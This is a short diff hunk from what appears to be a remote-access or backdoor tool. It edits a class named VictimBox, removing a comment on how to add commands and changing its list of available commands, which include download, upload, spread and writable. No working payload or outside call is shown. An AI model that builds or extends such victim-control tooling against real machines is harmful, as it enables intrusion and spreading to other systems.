@@ -39,10 +39,7 @@ class VictimBox(object):
         except URLError:
             self.local_ip = 'Unknown'
 
-        # adding another command requires editing two modules
-        # 1st- define the method here "victim_info.py" module
-        # then add a logic statment in "executer.py" module
-        self.available_commands = "['banner', 'clear', 'download', 'enum --health', 'exit', 'history', 'info', 'spread', 'upload', 'writable']"
+        self.available_commands = "['banner', 'clear', 'download', 'enum', 'exit', 'history', 'info', 'spread', 'upload', 'writable']"
 
     def get_information(self):
         self.info = \
